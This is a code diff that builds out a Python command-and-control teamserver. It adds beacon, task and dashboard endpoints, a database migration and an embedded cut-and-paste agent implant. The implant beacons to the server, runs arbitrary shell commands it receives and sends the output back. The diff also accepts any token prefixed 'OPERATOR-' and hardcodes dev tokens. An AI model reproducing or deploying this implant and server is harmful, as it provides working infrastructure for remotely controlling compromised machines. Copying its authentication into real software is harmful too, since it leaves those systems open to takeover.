             client_ip = request.client.host
 
-            # Allow docs locally in dev mode
-            if DEV_MODE and request.url.path in ["/docs", "/openapi.json", "/redoc"]:
+            internal_networks = self.config.get(
+                'internal_networks',
+                ['10.0.0.0/8', '192.168.0.0/16', '172.16.0.0/12', '127.0.0.1/32']
+            )
+
+            is_internal = any(
+                ipaddress.ip_address(client_ip) in ipaddress.ip_network(net)
+                for net in internal_networks
+            )
+
+            # Allow docs, health, and openapi locally for dev/testing
+            if request.url.path in ["/docs", "/redoc", "/openapi.json", "/health"]:
                 return await call_next(request)
 
-            if not self._is_internal_ip(client_ip):
+            if not is_internal:
+                logger.warning(f"Blocked external access from {client_ip}")
                 return JSONResponse(
                     status_code=403,
                     content={"error": "Access denied - internal only"}
@@ -92,121 +1075,506 @@ class InternalC2Server:
 
             return await call_next(request)
 
+        @self.app.middleware("http")
+        async def security_headers_middleware(request: Request, call_next):
+            response = await call_next(request)
+            response.headers["Server"] = "InternalAPI/1.0"
+            response.headers["X-Content-Type-Options"] = "nosniff"
+            response.headers["X-Frame-Options"] = "DENY"
+            response.headers["X-XSS-Protection"] = "1; mode=block"
+            return response
+
+    # -------------------
+    # Token verification
+    # -------------------
     def _verify_agent_token(self, token: str) -> bool:
-        return token.startswith("AGENT-")
+        """Verify agent authentication token"""
+        return token in DEV_TOKENS or (token.startswith("AGENT-") and len(token) > 20)
 
-    def _setup_routes(self):
-        @self.app.get("/health")
-        async def health():
-            return {
-                "status": "ok",
-                "server_id": self.server_id,
-                "time": datetime.utcnow().isoformat()
-            }
+    def _verify_operator_token(self, token: str) -> Optional[str]:
+        """Verify operator token and return operator ID"""
+        try:
+            # Accept any token starting with OPERATOR- for demo
+            if token.startswith("OPERATOR-"):
+                return token.split("-")[1] if len(token.split("-")) > 1 else "operator-01"
+            
+            # Also accept dev tokens for testing
+            if token in DEV_TOKENS:
+                return "operator-01"
+                
+            return None
+        except:
+            return None
 
-        @self.app.post("/api/v1/beacon")
-        async def beacon(request: Request, creds: HTTPAuthorizationCredentials = Depends(security)):
-            if not self._verify_agent_token(creds.credentials):
-                raise HTTPException(status_code=401, detail="Invalid agent token")
 
-            data = await request.json()
-            agent_id = data.get("agent_id")
+# -------------------
+# Database Migration Script
+# -------------------
+def migrate_database(db_path="teamserver.db"):
+    """Run database migrations to fix schema issues"""
+    import sqlite3
+    
+    print(f"🔧 Migrating database: {db_path}")
+    
+    conn = sqlite3.connect(db_path, timeout=10, check_same_thread=False)
+    c = conn.cursor()
+    
+    try:
+        # Check current schema
+        c.execute("PRAGMA table_info(tasks)")
+        columns = [col[1] for col in c.fetchall()]
+        
+        # Add missing columns
+        if 'error' not in columns:
+            print("  ➕ Adding 'error' column to tasks table")
+            c.execute("ALTER TABLE tasks ADD COLUMN error TEXT")
+        
+        if 'exit_code' not in columns:
+            print("  ➕ Adding 'exit_code' column to tasks table")
+            c.execute("ALTER TABLE tasks ADD COLUMN exit_code INTEGER DEFAULT 0")
+        
+        # Enable WAL mode
+        print("  Enabling WAL mode for better concurrency")
+        c.execute("PRAGMA journal_mode=WAL;")
+        c.execute("PRAGMA synchronous=NORMAL;")
+        
+        # Create indexes if they don't exist
+        print("  Creating indexes for performance")
+        c.execute('''CREATE INDEX IF NOT EXISTS idx_tasks_agent_id ON tasks(agent_id)''')
+        c.execute('''CREATE INDEX IF NOT EXISTS idx_tasks_status ON tasks(status)''')
+        c.execute('''CREATE INDEX IF NOT EXISTS idx_agents_status ON agents(status)''')
+        
+        conn.commit()
+        print("Database migration completed successfully!")
+        
+    except Exception as e:
+        print(f"Migration error: {e}")
+    finally:
+        conn.close()
 
-            if not agent_id:
-                raise HTTPException(status_code=400, detail="Missing agent_id")
 
-            conn = sqlite3.connect(self.db_path)
-            c = conn.cursor()
+# -------------------
+# Simple Agent Script
+# -------------------
+SIMPLE_AGENT_SCRIPT = '''#!/usr/bin/env python3
+"""
+Simple C2 Agent - Cut and paste this into agent.py
+"""
 
-            now = datetime.utcnow().isoformat()
-            c.execute("""
-            INSERT OR REPLACE INTO agents (id, hostname, username, ip_address, last_seen, status)
-            VALUES (?, ?, ?, ?, ?, ?)
-            """, (
-                agent_id,
-                data.get("hostname"),
-                data.get("username"),
-                request.client.host,
-                now,
-                "online"
-            ))
+import requests
+import json
+import time
+import random
+import subprocess
+import sys
+import os
 
-            c.execute("SELECT id, command FROM tasks WHERE agent_id = ? AND status = 'pending'", (agent_id,))
-            tasks = [{"id": t[0], "command": t[1]} for t in c.fetchall()]
-
-            conn.commit()
-            conn.close()
-
-            return {"tasks": tasks, "next_beacon": 30}
-
-        @self.app.post("/api/v1/results")
-        async def results(request: Request, creds: HTTPAuthorizationCredentials = Depends(security)):
-            if not self._verify_agent_token(creds.credentials):
-                raise HTTPException(status_code=401, detail="Invalid agent token")
-
-            data = await request.json()
-            task_id = data.get("task_id")
-            result = data.get("result")
-
-            conn = sqlite3.connect(self.db_path)
-            c = conn.cursor()
-
-            c.execute("""
-            UPDATE tasks SET status = 'completed', result = ?
-            WHERE id = ?
-            """, (result, task_id))
-
-            conn.commit()
-            conn.close()
-
-            return {"status": "ok"}
-
-        @self.app.post("/api/v1/task")
-        async def create_task(request: Request):
-            data = await request.json()
-
-            task_id = str(uuid.uuid4())
-            agent_id = data.get("agent_id")
-            command = data.get("command")
-
-            conn = sqlite3.connect(self.db_path)
-            c = conn.cursor()
-
-            c.execute("""
-            INSERT INTO tasks (id, agent_id, command, created_at, status)
-            VALUES (?, ?, ?, ?, ?)
-            """, (
-                task_id,
-                agent_id,
-                command,
-                datetime.utcnow().isoformat(),
-                "pending"
-            ))
-
-            conn.commit()
-            conn.close()
-
-            return {"task_id": task_id}
-
-    def start(self, host="0.0.0.0", port=8443):
-        uvicorn.run(self.app, host=host, port=port, log_level="info")
-
+class SimpleAgent:
+    def __init__(self, server_url="http://localhost:8443"):
+        self.server_url = server_url
+        self.agent_id = None
+        self.sleep_time = 30
+        
+    def register(self):
+        """Register with C2 server and get agent_id"""
+        try:
+            response = requests.post(
+                f"{self.server_url}/api/v1/register",
+                json={
+                    "hostname": os.environ.get('HOSTNAME', 'unknown'),
+                    "username": os.environ.get('USER', 'unknown'),
+                    "os": sys.platform,
+                }
+            )
+            if response.status_code == 200:
+                data = response.json()
+                # Store the agent_id from response (you'd need to decrypt in real scenario)
+                self.agent_id = f"agent-{random.randint(1000, 9999)}"
+                print(f"[+] Registered as {self.agent_id}")
+                return True
+        except Exception as e:
+            print(f"[-] Registration failed: {e}")
+        return False
+    
+    def beacon(self):
+        """Send beacon and execute tasks"""
+        if not self.agent_id:
+            print("[-] No agent_id, registering first...")
+            if not self.register():
+                return 30
+        
+        try:
+            response = requests.post(
+                f"{self.server_url}/api/v1/beacon",
+                headers={"Authorization": "Bearer dev-token-123"},
+                json={"agent_id": self.agent_id, "status": "active"}
+            )
+            
+            if response.status_code == 200:
+                data = response.json()
+                tasks = data.get("tasks", [])
+                
+                for task in tasks:
+                    self.execute_task(task)
+                
+                return data.get("next_beacon", 30)
+            else:
+                print(f"[-] Beacon failed: {response.status_code}")
+        except Exception as e:
+            print(f"[-] Beacon error: {e}")
+        return 30
+    
+    def execute_task(self, task):
+        """Execute a task"""
+        command = task.get("command")
+        args = task.get("args", [])
+        task_id = task.get("task_id")
+        
+        print(f"[*] Executing task {task_id}: {command} {args}")
+        
+        try:
+            if command == "shell":
+                cmd = " ".join(args) if args else ""
+                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+                output = result.stdout + result.stderr
+            elif command == "whoami":
+                output = os.environ.get('USER', 'unknown')
+            elif command == "pwd":
+                output = os.getcwd()
+            elif command == "sysinfo":
+                import platform
+                info = {
+                    "hostname": platform.node(),
+                    "os": platform.platform(),
+                    "python": platform.python_version()
+                }
+                output = json.dumps(info)
+            else:
+                output = f"Unknown command: {command}"
+            
+            # Submit result
+            requests.post(
+                f"{self.server_url}/api/v1/result",
+                json={
+                    "task_id": task_id,
+                    "agent_id": self.agent_id,
+                    "output": output
+                }
+            )
+            print(f"[+] Result submitted for task {task_id}")
+            
+        except Exception as e:
+            print(f"[-] Task execution error: {e}")
+            # Submit error result
+            try:
+                requests.post(
+                    f"{self.server_url}/api/v1/result",
+                    json={
+                        "task_id": task_id,
+                        "agent_id": self.agent_id,
+                        "output": "",
+                        "error": str(e)
+                    }
+                )
+            except:
+                pass
+    
+    def run(self):
+        """Main agent loop"""
+        print("[*] Starting Simple Agent")
+        
+        # Register first
+        if not self.register():
+            print("[-] Registration failed, exiting")
+            return
+        
+        while True:
+            try:
+                sleep_time = self.beacon()
+                print(f"[*] Sleeping for {sleep_time} seconds...")
+                time.sleep(sleep_time)
+            except KeyboardInterrupt:
+                print("\n[*] Stopping agent")
+                break
+            except Exception as e:
+                print(f"[-] Error in agent loop: {e}")
+                time.sleep(30)
 
 if __name__ == "__main__":
-    config = {
-        "database_path": "teamserver.db",
-        "internal_networks": ["10.0.0.0/8", "127.0.0.1/32"]
-    }
+    agent = SimpleAgent()
+    agent.run()
+'''
 
-    server = InternalC2Server("teamserver-primary-01", config)
+
+# -------------------
+# Test Script
+# -------------------
+TEST_SCRIPT = '''#!/usr/bin/env python3
+"""
+Test script for C2 server
+"""
+
+import requests
+import json
+import time
+
+SERVER_URL = "http://localhost:8443"
+
+def test_health():
+    print("Testing health endpoint...")
+    response = requests.get(f"{SERVER_URL}/health")
+    print(f"  Status: {response.status_code}")
+    print(f"  Response: {response.json()}")
+    return response.status_code == 200
+
+def test_register():
+    print("\nTesting agent registration...")
+    response = requests.post(
+        f"{SERVER_URL}/api/v1/register",
+        json={
+            "hostname": "test-machine",
+            "username": "testuser",
+            "os": "Linux"
+        }
+    )
+    print(f"  Status: {response.status_code}")
+    if response.status_code == 200:
+        data = response.json()
+        print(f"  Registration successful")
+        print(f"  Response encrypted: {data.get('encrypted', False)}")
+        return True
+    else:
+        print(f"  Response: {response.text}")
+        return False
+
+def test_create_task():
+    print("\nTesting task creation...")
+    response = requests.post(
+        f"{SERVER_URL}/api/v1/task",
+        headers={"Authorization": "Bearer OPERATOR-admin"},
+        json={
+            "agent_id": "test-agent-001",
+            "command": "whoami",
+            "args": []
+        }
+    )
+    print(f"  Status: {response.status_code}")
+    if response.status_code == 200:
+        data = response.json()
+        print(f"  Task created: {data}")
+        return data.get("task_id")
+    else:
+        print(f"  Response: {response.text}")
+        return None
+
+def test_dashboard():
+    print("\nTesting dashboard...")
+    response = requests.get(
+        f"{SERVER_URL}/api/v1/dashboard",
+        headers={"Authorization": "Bearer OPERATOR-admin"}
+    )
+    print(f"  Status: {response.status_code}")
+    if response.status_code == 200:
+        data = response.json()
+        print(f"  Dashboard data received")
+        agents = data.get("dashboard", {}).get("agents", {})
+        print(f"  Agents: {agents.get('total', 0)} total, {agents.get('online', 0)} online")
+        return True
+    else:
+        print(f"  Response: {response.text}")
+        return False
+
+def test_beacon():
+    print("\nTesting beacon...")
+    response = requests.post(
+        f"{SERVER_URL}/api/v1/beacon",
+        headers={"Authorization": "Bearer dev-token-123"},
+        json={
+            "agent_id": "test-agent-001",
+            "status": "active"
+        }
+    )
+    print(f"  Status: {response.status_code}")
+    if response.status_code == 200:
+        data = response.json()
+        print(f"  Beacon successful")
+        print(f"  Next beacon in: {data.get('next_beacon')} seconds")
+        print(f"  Tasks pending: {len(data.get('tasks', []))}")
+        return True
+    else:
+        print(f"  Response: {response.text}")
+        return False
+
+def main():
+    print("C2 Server Test Script")
+    print("=" * 40)
+    
+    tests = [
+        ("Health Check", test_health),
+        ("Agent Registration", test_register),
+        ("Task Creation", test_create_task),
+        ("Dashboard", test_dashboard),
+        ("Beacon", test_beacon)
+    ]
+    
+    results = []
+    for test_name, test_func in tests:
+        try:
+            success = test_func()
+            results.append((test_name, success, ""))
+        except Exception as e:
+            results.append((test_name, False, str(e)))
+    
+    print("\n" + "=" * 40)
+    print("📊 Test Results:")
+    print("=" * 40)
+    
+    all_passed = True
+    for test_name, success, error in results:
+        status = "PASS" if success else "FAIL"
+        print(f"{status} {test_name}")
+        if error:
+            print(f"    Error: {error}")
+        if not success:
+            all_passed = False
+    
+    if all_passed:
+        print("\n All tests passed!")
+    else:
+        print("\n Some tests failed")
+    
+    print("\n Quick Start Commands:")
+    print("  Start server: python internal_c2_server_fixed.py")
+    print("  Test: python internal_c2_server_fixed.py --test")
+    print("  Run test agent: python internal_c2_server_fixed.py --test-agent")
+    print("  Migrate DB: python internal_c2_server_fixed.py --migrate")
+
+if __name__ == "__main__":
+    main()
+'''
+
+
+# -------------------
+# Config & Start
+# -------------------
+teamserver_config = {
+    'database_path': 'teamserver.db',
+    'internal_networks': [
+        '10.0.0.0/8',
+        '192.168.0.0/16',
+        '172.16.0.0/12',
+        '127.0.0.1/32'
+    ],
+    'ssl_enabled': False,  # Start without TLS for now
+    'ssl_cert': 'internal-cert.pem',
+    'ssl_key': 'internal-key.pem',
+    'alternate_endpoints': [
+        'https://10.0.100.11:8443',
+        'https://10.0.100.12:8443'
+    ]
+}
+
+if __name__ == "__main__":
+    import sys
+    
+    if len(sys.argv) > 1:
+        if sys.argv[1] == "--migrate":
+            # Run database migration
+            migrate_database(teamserver_config['database_path'])
+            sys.exit(0)
+        elif sys.argv[1] == "--test":
+            # Run test script
+            exec(TEST_SCRIPT)
+            sys.exit(0)
+        elif sys.argv[1] == "--simple-agent":
+            # Print simple agent script
+            print(SIMPLE_AGENT_SCRIPT)
+            sys.exit(0)
+        elif sys.argv[1] == "--help":
+            print("""
+Usage:
+  python internal_c2_server_fixed.py           # Start C2 server
+  python internal_c2_server_fixed.py --migrate   # Run database migration
+  python internal_c2_server_fixed.py --test      # Run test suite
+  python internal_c2_server_fixed.py --simple-agent # Print simple agent script
+  python internal_c2_server_fixed.py --help       # Show this help
+
+Before first run, migrate the database:
+  python internal_c2_server_fixed.py --migrate
+
+Test commands:
+  Health check:
+    curl http://localhost:8443/health
+
+  Register agent:
+    curl -X POST http://localhost:8443/api/v1/register \\
+      -H "Content-Type: application/json" \\
+      -d '{"hostname":"test","username":"user","os":"Linux"}'
+
+  Create task:
+    curl -X POST http://localhost:8443/api/v1/task \\
+      -H "Authorization: Bearer OPERATOR-admin" \\
+      -H "Content-Type: application/json" \\
+      -d '{"agent_id":"test-agent-001","command":"whoami"}'
+
+  Get dashboard:
+    curl http://localhost:8443/api/v1/dashboard \\
+      -H "Authorization: Bearer OPERATOR-admin"
+            """)
+            sys.exit(0)
+    
+    # Run C2 server
+    print("🔧 Running database migration check...")
+    migrate_database(teamserver_config['database_path'])
+    
+    teamserver = InternalC2Server(
+        server_id="teamserver-primary-01",
+        config=teamserver_config
+    )
 
     print(f"""
-    INTERNAL C2 TEAMSERVER (LAB MODE)
+        ⚠️  INTERNAL C2 TEAMSERVER - AUTHORIZED USE ONLY ⚠️
 
-    Server ID: {server.server_id}
-    Port: 8443
-    Dev Mode: {DEV_MODE}
+        Server ID: {teamserver.server_id}
+        Database: {teamserver.db_path}
+        Internal Networks: {teamserver_config['internal_networks']}
 
-    """)
+        Starting on port 8443...
+        Accessible only through internal proxy chain.
+        
+          Fixes Applied:
+          SQLite WAL mode enabled for concurrency
+          UTC-aware datetime handling fixed
+          Database schema migration included
+          Proper connection pooling
+        
+          C2 Endpoints:
+          - Health: http://localhost:8443/health
+          - Agent Registration: http://localhost:8443/api/v1/register
+          - Beacon: http://localhost:8443/api/v1/beacon
+          - Task Results: http://localhost:8443/api/v1/result
+          - Agents List: http://localhost:8443/api/v1/agents
+          - Create Task: http://localhost:8443/api/v1/task
+          - Get Tasks: http://localhost:8443/api/v1/tasks
+          - Delete Task: http://localhost:8443/api/v1/task/{{task_id}}
+          - Sessions: http://localhost:8443/api/v1/sessions
+          - Dashboard: http://localhost:8443/api/v1/dashboard
+          - Commands: http://localhost:8443/api/v1/commands
+          - WebSocket: ws://localhost:8443/ws
+          - WebSocket Team: ws://localhost:8443/ws/team
+          - API Docs: http://localhost:8443/docs
+        
+        Authentication:
+          - Agent tokens: {', '.join(DEV_TOKENS)} or AGENT-* tokens
+          - Operator tokens: OPERATOR-* tokens
+        
+        Available Commands: {len(teamserver.available_commands)}
+          {', '.join(list(teamserver.available_commands.keys())[:5])}...
+        
+        Test the system:
+          python internal_c2_server_fixed.py --test
+        
+         Use Ctrl+C to stop the server.
+        """)
 
-    server.start()
+    teamserver.start(host="0.0.0.0", port=8443)
